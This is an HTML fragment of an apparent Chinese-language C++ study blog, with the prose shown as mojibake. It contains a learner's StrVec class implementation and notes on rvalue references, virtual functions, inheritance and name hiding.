class="meta-keyword">include</span><span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StrVec</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">StrVec</span>():<span class="built_in">elements</span>(<span class="literal">nullptr</span>),<span class="built_in">first_free</span>(<span class="literal">nullptr</span>),<span class="built_in">cap</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">    <span class="built_in">StrVec</span>(std::initializer_list&lt;std::string&gt;);</span><br><span class="line">    <span class="built_in">StrVec</span>(<span class="keyword">const</span> StrVec&amp;);</span><br><span class="line">    StrVec&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> StrVec&amp;);</span><br><span class="line">    std::string&amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> );</span><br><span class="line">    ~<span class="built_in">StrVec</span>();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">const</span> std::string&amp;)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first_free-elements;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">capacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cap-elements;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::string* <span class="title">begin</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> elements;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::string* <span class="title">end</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first_free;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">size_t</span>,<span class="keyword">const</span> std::string&amp; s=std::string(<span class="string">&quot;&quot;</span>))</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reserve</span><span class="params">(<span class="keyword">size_t</span>)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> std::allocator&lt;std::string&gt; alloc;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chk_n_alloc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">size</span>()==<span class="built_in">capacity</span>())&#123;</span><br><span class="line">            <span class="built_in">reallocate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::pair&lt;std::string*,std::string*&gt; <span class="title">alloc_n_copy</span><span class="params">(<span class="keyword">const</span> std::string*,<span class="keyword">const</span> std::string*)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reallocate</span><span class="params">()</span></span>;</span><br><span class="line">    std::string *elements;</span><br><span class="line">    std::string *first_free;</span><br><span class="line">    std::string *cap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_STRVEC_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;StrVec.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">std::allocator&lt;std::string&gt; StrVec::alloc;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::push_back</span><span class="params">(<span class="keyword">const</span> std::string &amp;s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">chk_n_alloc</span>();</span><br><span class="line">    alloc.<span class="built_in">construct</span>(first_free++,s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;std::string *, std::string *&gt; <span class="title">StrVec::alloc_n_copy</span><span class="params">(<span class="keyword">const</span> std::string *b, <span class="keyword">const</span> std::string *e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> data=alloc.<span class="built_in">allocate</span>(e-b);</span><br><span class="line">    <span class="keyword">return</span> &#123;data, std::<span class="built_in">uninitialized_copy</span>(b,e,data)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(elements)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p=first_free;p!=elements;)&#123;</span><br><span class="line">            alloc.<span class="built_in">destroy</span>(--p);</span><br><span class="line">        &#125;</span><br><span class="line">        alloc.<span class="built_in">deallocate</span>(elements,cap-elements);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">StrVec::<span class="built_in">StrVec</span>(<span class="keyword">const</span> StrVec &amp; strvec) &#123;</span><br><span class="line">    <span class="keyword">auto</span> newstrings= <span class="built_in">alloc_n_copy</span>(strvec.<span class="built_in">begin</span>(),strvec.<span class="built_in">end</span>());</span><br><span class="line">    elements=newstrings.first;</span><br><span class="line">    first_free=cap=newstrings.second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">StrVec &amp;StrVec::<span class="keyword">operator</span>=(<span class="keyword">const</span> StrVec &amp;strvec) &#123;</span><br><span class="line">    <span class="keyword">auto</span> newstrings= <span class="built_in">alloc_n_copy</span>(strvec.<span class="built_in">begin</span>(),strvec.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    elements=newstrings.first;</span><br><span class="line">    first_free=cap=newstrings.second;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::reallocate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> newvecsize=<span class="built_in">size</span>()? <span class="built_in">size</span>()*<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">auto</span> newelement=alloc.<span class="built_in">allocate</span>(newvecsize);</span><br><span class="line">    <span class="keyword">auto</span> dest=newelement;</span><br><span class="line">    <span class="keyword">auto</span> src=elements;</span><br><span class="line">    <span class="keyword">while</span>(src!=first_free)&#123;</span><br><span class="line">        alloc.<span class="built_in">construct</span>(dest++,std::<span class="built_in">move</span>(*src++));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    elements=newelement;</span><br><span class="line">    first_free=dest;</span><br><span class="line">    cap=elements+newvecsize;</span><br><span class="line">&#125;</span><br><span class="line">StrVec::~<span class="built_in">StrVec</span>() &#123;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::resize</span><span class="params">(<span class="keyword">size_t</span> newsize, <span class="keyword">const</span> std::string &amp;s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> newelement=alloc.<span class="built_in">allocate</span>(newsize);</span><br><span class="line">    <span class="keyword">auto</span> dest=newelement;</span><br><span class="line">    <span class="keyword">auto</span> src=elements;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;(i&lt;newsize)&amp;&amp;(src!=first_free);i++)&#123;</span><br><span class="line">        alloc.<span class="built_in">construct</span>(dest++,std::<span class="built_in">move</span>(*src++));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    elements=newelement;</span><br><span class="line">    first_free=dest;</span><br><span class="line">    cap=elements+newsize;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::reserve</span><span class="params">(<span class="keyword">size_t</span> newsize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(newsize&gt;<span class="built_in">capacity</span>())&#123;</span><br><span class="line">        <span class="built_in">resize</span>(newsize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">StrVec::<span class="built_in">StrVec</span>(std::initializer_list&lt;std::string&gt; lst) :<span class="built_in">elements</span>(<span class="literal">nullptr</span>),<span class="built_in">first_free</span>(<span class="literal">nullptr</span>),<span class="built_in">cap</span>(<span class="literal">nullptr</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> iter=lst.<span class="built_in">begin</span>();iter!=lst.<span class="built_in">end</span>();iter++)&#123;</span><br><span class="line">        <span class="built_in">push_back</span>(*iter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::string &amp;StrVec::<span class="keyword">operator</span>[](<span class="keyword">int</span> idx) &#123;</span><br><span class="line">    <span class="keyword">return</span> *(elements+idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å·¦å€¼-å³å€¼-å·¦å€¼å¼•ç”¨-å³å€¼å¼•ç”¨"><a href="#å·¦å€¼-å³å€¼-å·¦å€¼å¼•ç”¨-å³å€¼å¼•ç”¨" class="headerlink" title="å·¦å€¼ å³å€¼ å·¦å€¼å¼•ç”¨ å³å€¼å¼•ç”¨"></a>å·¦å€¼ å³å€¼ å·¦å€¼å¼•ç”¨ å³å€¼å¼•ç”¨</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jacky_Feng/article/details/120742414">(93æ¡æ¶ˆæ¯) ã€C++ã€‘å·¦å€¼å’Œå³å€¼ã€å·¦å€¼å¼•ç”¨ï¼ˆ&amp;ï¼‰å’Œå³å€¼å¼•ç”¨ï¼ˆ&amp;&amp;ï¼‰_Jacky_Fengçš„åšå®¢-CSDNåšå®¢_c++ å·¦å€¼å³å€¼&amp;&amp;çš„ä½œç”¨</a></p>
<p>æ¯”è¾ƒæœ‰æ„æ€çš„ç‚¹æ˜¯å³å€¼å¼•ç”¨å˜é‡æ˜¯å·¦å€¼ã€‚æ‰€ä»¥ä¸èƒ½æŠŠä¸€ä¸ªå³å€¼å¼•ç”¨å˜é‡èµ‹å€¼ç»™ä¸€ä¸ªå³å€¼å¼•ç”¨å˜é‡ã€‚å› ä¸ºå³å€¼å¼•ç”¨å˜é‡æ˜¯ä¸€ä¸ªå˜é‡ï¼Œåœ¨å†…å­˜ä¸­æœ‰å¯¹åº”åœ°å€ï¼Œæ‰€ä»¥ä»–æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªå³å€¼ï¼Œè€Œæ˜¯ä¸€ä¸ªå·¦å€¼ã€‚</p>
<h2 id="ç±»çš„å°çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#ç±»çš„å°çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="ç±»çš„å°çŸ¥è¯†ç‚¹æ€»ç»“"></a>ç±»çš„å°çŸ¥è¯†ç‚¹æ€»ç»“</h2><ul>
<li><p>åŠ¨æ€ç»‘å®šå°±ç›¸å½“äºå¤šæ€ï¼Œå¤šæ€ä¸ä»…å¯ä»¥é€šè¿‡æŒ‡é’ˆæ¥ä½¿ç”¨ï¼Œè¿˜å¯ä»¥é€šè¿‡å¼•ç”¨</p>
</li>
<li><p>è™šå‡½æ•°ä¹Ÿå¯ä»¥åœ¨è‡ªå·±çš„ç±»ä¸­è¿›è¡Œå®šä¹‰</p>
</li>
<li><p>ææ„å‡½æ•°æ˜¯å¯ä»¥è™šå‡½æ•°çš„ï¼Œåœ¨åŸºç±»ä¸­é€šå¸¸å°±åº”è¯¥å®šä¹‰ä¸€ä¸ªè™šææ„å‡½æ•°ã€‚</p>
</li>
<li><p>ä»»ä½•æ„é€ å‡½æ•°ä¹‹å¤–çš„éé™æ€å‡½æ•°éƒ½å¯ä»¥æ˜¯è™šå‡½æ•°ã€‚</p>
</li>
<li><p>æ´¾ç”Ÿç±»å¿…é¡»å°†ç»§æ‰¿è€Œæ¥çš„æˆå‘˜å‡½æ•°ä¸­éœ€è¦è¦†ç›–çš„é‚£äº›é‡æ–°å£°æ˜ã€‚</p>
</li>
<li><p>æ´¾ç”Ÿç±»å¦‚æœæ˜¯publicç»§æ‰¿äº†ç±»ï¼Œé‚£ä»–å°±åªå¯ä»¥è®¿é—®çˆ¶ç±»çš„å…¬æœ‰æˆå‘˜å’Œå—ä¿æŠ¤æˆå‘˜0ï¼Œä¸å¯ä»¥è®¿é—®ç§æœ‰æˆå‘˜ã€‚</p>
</li>
<li><p>å¦‚æœæ´¾ç”Ÿç±»çš„è™šå‡½æ•°éœ€è¦ä½¿ç”¨é»˜è®¤å®å‚ï¼ŒåŸºç±»å’Œæ´¾ç”Ÿç±»ä¸­å®šä¹‰çš„é»˜è®¤å®å‚æœ€å¥½ä¸€è‡´ï¼Œä¸ç„¶é€šè¿‡å¤šæ€è°ƒç”¨æ´¾ç”Ÿç±»çš„è™šå‡½æ•°çš„æ—¶å€™ï¼Œä¼ å…¥çš„é»˜è®¤å‚æ•°æ˜¯åŸºç±»çš„é»˜è®¤å‚æ•°ã€‚</p>
</li>
<li><p>æ´¾ç”Ÿç±»å¯ä»¥é‡å†™æˆ–è€…ä¸é‡å†™åŸºç±»çš„è™šå‡½æ•°ï¼Œä½†æ˜¯çº¯è™šå‡½æ•°æ´¾ç”Ÿç±»å¿…é¡»å¾—é‡å†™ï¼Œé™¤éæ´¾ç”Ÿç±»ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡åŸºç±»ã€‚</p>
</li>
<li><p>protectedæ˜¯publibcå’Œprivateçš„ä¸­å’Œäº§ç‰©ï¼Œå½“ä½¿ç”¨protectedä¿®é¥°æˆå‘˜çš„æ—¶å€™ï¼Œè¿™ä¸ªæˆå‘˜å°±æ˜¯å—ä¿æŠ¤æˆå‘˜ï¼Œè¿™ä¸ªæˆå‘˜å¯¹äºç±»çš„ç”¨æˆ·æ¥è¯´ä¸å¯è§ï¼Œä½†æ˜¯å¯¹ç±»çš„æ´¾ç”Ÿç±»å¯è§ã€‚        </p>
</li>
<li><p>å¯¹äºè®¿é—®æƒé™å’Œç»§æ‰¿æ¥è¯´ï¼Œæœ‰ä¸¤ä¸ªå½±å“å˜é‡ï¼Œå¯ä»¥é€šè¿‡ä¸‰ä¸ªè§’åº¦æ¥è®¨è®ºï¼Œå³ç±»çš„ä½¿ç”¨è€…ï¼Œç±»æ˜¯å®ç°è€…ï¼Œç±»çš„æ´¾ç”Ÿç±»ã€‚è§£é‡Šèµ·æ¥æœ‰äº›éº»çƒ¦ï¼Œå¿˜äº†è¿˜æ˜¯ç›´æ¥çœ‹ä¹¦å§ï¼Œp542å¤„.</p>
</li>
<li><p>æ´¾ç”Ÿç±»çš„ä½œç”¨åŸŸä½äºåŸºç±»ä½œç”¨åŸŸä¹‹å†…ï¼Œåœ¨å¦‚æœè°ƒç”¨ç±»çš„æŸä¸ªæˆå‘˜å‡½æ•°æ—¶é¦–å…ˆè¿›è¡Œåå­—åŒ¹é…ï¼Œä»è¿™ä¸ªç±»æ‰¾èµ·ï¼Œå¦‚æœè¿™ä¸ªç±»æ²¡æœ‰é‚£å°±ä»è¿™ä¸ªç±»çš„çˆ¶ç±»æ‰¾èµ·ï¼Œå¦‚æœæ²¡æœ‰æ‰¾è§é‚£å°±ä¸€ç›´æ‰¾åˆ°è¿™ä¸ªç»§æ‰¿é“¾çš„é¡¶ç‚¹ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°é‚£å°±æŠ¥é”™ï¼Œå¦‚æœåå­—åŒ¹é…ä¸Šäº†ï¼Œé‚£å°±å†è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œæ£€æŸ¥é€šè¿‡äº†å°±æ˜¯åˆæ³•è°ƒç”¨ã€‚</p>
</li>
<li><p>æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯æ´¾ç”Ÿç±»ä¸å­˜åœ¨å¯¹åŸºç±»çš„é‡è½½ï¼Œå¦‚æœæ´¾ç”Ÿç±»çš„å˜é‡æˆ–è€…å‡½æ•°çš„åå­—å’ŒåŸºç±»é‡äº†é‚£æ´¾ç”Ÿç±»å°±ä¼šéšè—åŸºç±»çš„é‡åå‡½æ•°æˆ–è€…é‡åå˜é‡ï¼Œé‚£å…¶å®é‡åå˜é‡åœ¨å†…å­˜ä¸­æœ‰ä¸¤ä»½äº†ï¼Œå¿…é¡»å¾—é€šè¿‡ä½œç”¨åŸŸè¿ç®—ç¬¦æ¥å¼ºåˆ¶è®¿é—®ï¼Œä¸‹é¢çš„ä»£ç å°±æ˜¯å¾ˆå¥½çš„è§£é‡Š,å€¼å¾—æ³¨æ„çš„æ˜¯åå­—æŸ¥æ‰¾ä¼˜äºç±»å‹æŸ¥æ‰¾ï¼Œå¦‚æœæ´¾ç”Ÿç±»ä¸­çš„æˆå‘˜å‡½æ•°åªæœ‰åå­—å’ŒåŸºç±»å‡½æ•°é‡åï¼Œç±»å‹å®Œå…¨ä¸ä¸€æ ·ï¼Œæ´¾ç”Ÿç±»è¿˜æ˜¯ä¼šéšè—åŸºç±»çš„å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span>  c;</span><br><span class="line">    A()&#123;</span><br><span class="line">        c=<span class="number">14</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    B(<span class="keyword">int</span> c):c(c)&#123;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">get_c</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;A::c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">B <span class="title">b</span><span class="params">(<span class="number">23</span>)</span></span>;</span><br><span class="line">    b.c=<span class="number">12</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;b.c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    b.get_c();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;b.c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>å¦‚æœåŸºç±»ä¸­æœ‰ä¸€ä¸ªå‡½æ•°åçš„å¤šä¸ªé‡è½½ç‰ˆæœ¬ï¼Œåœ¨æ´¾ç”Ÿç±»ä¸­è¿˜æƒ³é‡è½½æŸä¸€ä¸ªç‰ˆæœ¬ï¼Œä¸èƒ½ç›´æ¥å¯¹å…¶é‡è½½ï¼ŒåŸå› ä¸Šè¿°å·²ç»è¯´æ¸…æ¥šäº†ï¼Œå¯ä»¥ä½¿ç”¨usingæŠŠæ‰€æœ‰çš„é‡è½½ç‰ˆæœ¬å…¨éƒ¨å¼•å…¥æ´¾ç”Ÿç±»ä¸­å†è¿›è¡Œé‡è½½ã€‚</p>
</li>
<li><p>ä¸€æ¡ç»éªŒå‡†åˆ™ï¼Œå¦‚æœä¸€ä¸ªç±»éœ€è¦ææ„å‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä¹ŸåŒæ ·éœ€è¦æ‹·è´å’Œèµ‹å€¼æ“ä½œã€‚ä½†æ˜¯åŸºç±»çš„è™šææ„å‡½æ•°æ˜¯ä¸ªä¾‹å¤–ã€‚åŸå› ä»”ç»†æƒ³æƒ³ä¹Ÿèƒ½æ˜ç™½ï¼Œæ­£å¸¸ä¸€ä¸ªç±»éœ€è¦ææ„å‡½æ•°æ˜¯å› ä¸ºæœ‰è‡ªå·±ç®¡ç†çš„èµ„æºäº†ï¼Œæœ‰è‡ªå·±ç®¡ç†çš„èµ„æºé‚£å°±å¾—è€ƒè™‘æ‹·è´å’Œèµ‹å€¼ç§»åŠ¨çš„æ—¶å€™åˆ°åº•è¯¥æ€ä¹ˆå¤„ç†ï¼Œä½†æ˜¯åŸºç±»ä¸ä¸€æ ·ï¼ŒåŸºç±»æœ‰ææ„å‡½æ•°æ˜¯å› ä¸ºè¦ä¸ºå¤šæ€æœåŠ¡ï¼Œä»–è‡ªå·±å¯èƒ½æœ‰èµ„æºå¯èƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥å¯ä»¥ä¸å¿…è¦æœ‰æ‹·è´èµ‹å€¼ç§»åŠ¨æ“çºµã€‚</p>
</li>
<li><p>è™šå‡½æ•°å’Œå¤šæ€æ˜¯å¼ºç»‘å®šçš„ï¼Œè™šå‡½æ•°å¹¶ä¸æ˜¯è¯´åŸºç±»æœ‰è™šå‡½æ•°ï¼Œæ´¾ç”Ÿç±»å°±å¿…é¡»å®ç°è™šå‡½æ•°ï¼Œè¿™æ˜¯é”™è¯¯çš„è§‚ç‚¹ï¼Œè™šå‡½æ•°æˆ‘æ„Ÿè§‰å°±æ˜¯å®Œå…¨ä¸ºäº†å¤šæ€æœåŠ¡ï¼Œå½“åŸºç±»çš„æŒ‡é’ˆæˆ–è€…å¼•ç”¨æŒ‡å‘äº†æ´¾ç”Ÿç±»æ—¶ï¼Œå¦‚æœè°ƒç”¨äº†è™šå‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨æŒ‡å‘çš„å¯¹è±¡çš„å‡½æ•°ã€‚æ‰€ä»¥å¦‚æœæ´¾ç”Ÿç±»éƒ½æœ‰æŸä¸ªåŠŸèƒ½ä½†æ˜¯å®ç°çš„æ–¹å¼ä¸ä¸€æ ·çš„è¯å°±å¯ä»¥æ ‡è®°æˆè™šå‡½æ•°ï¼Œé™¤æ­¤ä¹‹å¤–å°±æ²¡å¿…è¦äº†ã€‚ </p>
</li>
<li><p>å½“ä¸€ä¸ªç±»ä¸­æœ‰äº†ææ„å‡½æ•°å°±ä¸ä¼šåˆæˆç§»åŠ¨æ“ä½œï¼ŒåŸºç±»ä¸€å®šæœ‰ææ„å‡½æ•°ï¼Œæ‰€ä»¥æ­£å¸¸æƒ…å†µä¸‹ä¸€å®šæ²¡æœ‰åˆæˆçš„ç§»åŠ¨æ“ä½œï¼Œè¿™å°±ä¼šé˜»æ­¢æ´¾ç”Ÿç±»æ‹¥æœ‰è‡ªå·±çš„ç§»åŠ¨æ“ä½œï¼Œæ‰€ä»¥å¦‚æœæ´¾ç”Ÿç±»ç¡®å®éœ€è¦è‡ªå·±çš„ç§»åŠ¨æ“ä½œï¼Œå°±éœ€è¦åœ¨åŸºç±»ä¸­æ˜¾ç¤ºçš„å®šä¹‰ç§»åŠ¨æ“ä½œã€‚</p>
</li>
<li><p>ä¸ç®¡æ˜¯ç§»åŠ¨ï¼Œæ„é€ ï¼Œè¿˜æ˜¯æ‹·è´ï¼Œæ´¾ç”Ÿç±»éƒ½ä¼šåœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­è°ƒç”¨åŸºç±»çš„å¯¹åº”å‡½æ•°ï¼Œä»¥æ­¤æ¥ç§»åŠ¨ï¼Œæ„é€ æˆ–è€…æ‹·è´æ´¾ç”Ÿç±»ä¸­çš„åŸºç±»éƒ¨åˆ†ï¼Œç„¶ååœ¨å‡½æ•°ä½“ä¸­ç§»åŠ¨ï¼Œæ„é€ ï¼Œæˆ–è€…æ‹·è´æ´¾ç”Ÿç±»è‡ªå·±çš„éƒ¨åˆ†ã€‚</p>
</li>
<li><p>åœ¨ææ„å‡½æ•°æ‰§è¡Œå®Œä¹‹åï¼Œå¯¹è±¡çš„æˆå‘˜ä¼šè¢«éšå¼é”€æ¯ï¼Œç±»ä¼¼çš„ï¼Œå¯¹è±¡çš„åŸºç±»éƒ¨åˆ†ä¹Ÿæ˜¯éšå¼é”€æ¯ï¼Œæ‰€ä»¥æ²¡å¿…è¦åœ¨æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°ä¸­è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ã€‚</p>
</li>
<li><p>æœ€åä¸è¦åœ¨åŸºç±»çš„ç‰¹æ®Šå‡½æ•°ä¸­ä½¿ç”¨è™šå‡½æ•°ï¼Œå› ä¸ºå¦‚æœæ˜¯æ´¾ç”Ÿè°ƒç”¨åŸºç±»çš„ç‰¹æ®Šå‡½æ•°çš„æ—¶å€™åŸºç±»çš„ç‰¹æ®Šå‡½æ•°é‡Œçš„è™šå‡½æ•°å°±ä¼šæ‰§è¡Œæ´¾ç”Ÿç±»çš„è™šå‡½æ•°ç‰ˆæœ¬ï¼Œè¿™ä¼šå¯¼è‡´ä¸å¯çŸ¥çš„é”™è¯¯ã€‚å¦‚æœéœ€è¦ä½¿ç”¨çš„è¯æœ€å¥½æŒ‡æ˜è™šå‡½æ•°ç‰ˆæœ¬ã€‚</p>
</li>
</ul>
<h2 id="ç¬¬åäº”ç« -å•è¯æŸ¥è¯¢ç¨‹åº"><a href="#ç¬¬åäº”ç« -å•è¯æŸ¥è¯¢ç¨‹åº" class="headerlink" title="ç¬¬åäº”ç«  å•è¯æŸ¥è¯¢ç¨‹åº"></a>ç¬¬åäº”ç«  å•è¯æŸ¥è¯¢ç¨‹åº</h2><p>é€šè¿‡è¿™ä¸ªç»ƒä¹ è®©æˆ‘æ›´åŠ æ·±åˆ»çš„ç†è§£äº†ç±»çš„ç»§æ‰¿çš„å®é™…æ„ä¹‰ï¼Œå¯¹äºè¦å¤„ç†æŸä¸€ç±»äº‹æƒ…ï¼Œè¿™ç±»äº‹æƒ…åˆå¯ä»¥åˆ†æˆå¾ˆå¤šå°ç±»å‹çš„è¯ï¼Œé‚£å°±å¯ä»¥æå–æ‰€æœ‰å°ç±»å‹çš„å…¬å…±ç‰¹æ€§ç„¶åæˆä¸ºä¸€ä¸ªåŸºç±»ï¼Œè¿™äº›å°ç±»å‹ç»§æ‰¿è¿™äº›åŸºç±»ï¼Œå¦‚æœè¿™äº›å°ç±»å‹è¿˜å¯ä»¥å†ç»†åˆ†çš„è¯ï¼Œå†æ¬¡å¯¹å°ç±»å‹çš„æ‰€æœ‰å°ç±»å‹æå–å…±æœ‰ç‰¹æ€§æˆä¸ºä¸€ä¸ªåŸºç±»ï¼Œå°ç±»å‹çš„å°ç±»å‹ç»§æ‰¿è¿™ä¸ªåŸºç±»ï¼Œä¾æ¬¡ç±»æ¨ã€‚</p>
